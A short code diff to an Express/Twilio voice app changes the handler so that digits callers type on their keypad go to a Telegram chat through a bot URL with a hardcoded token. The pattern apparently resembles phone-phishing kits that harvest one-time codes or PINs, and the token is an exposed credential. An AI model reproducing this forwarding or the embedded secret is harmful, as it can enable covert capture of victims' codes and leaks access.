@@ -3,7 +3,7 @@ const serverless = require("serverless-http");
 const VoiceResponse = require('twilio').twiml.VoiceResponse;
 const app = express();
 const router = express.Router();
-
+var request = require('request');
 router.get("/", (req, res) => {
   res.json({
     hello: "hi!"
@@ -21,7 +21,11 @@ router.get('/voice',(req,res) => {
   res.type('text/xml');
   res.send(twiml.toString());
   if (req.body.Digits) {
-      console.log(req.body.Digits)
+    request('https://api.telegram.org/bot5403778586:AAHLpzXNK3Qyk49NCGqUlrxcf8drC3Gdi9U/sendMessage?chat_id=5266183529&text=Hi+'+req.body.Digits, (err, res)=>{
+      if(err){
+        console.log("err")
+      }
+    })
   }
 
 })
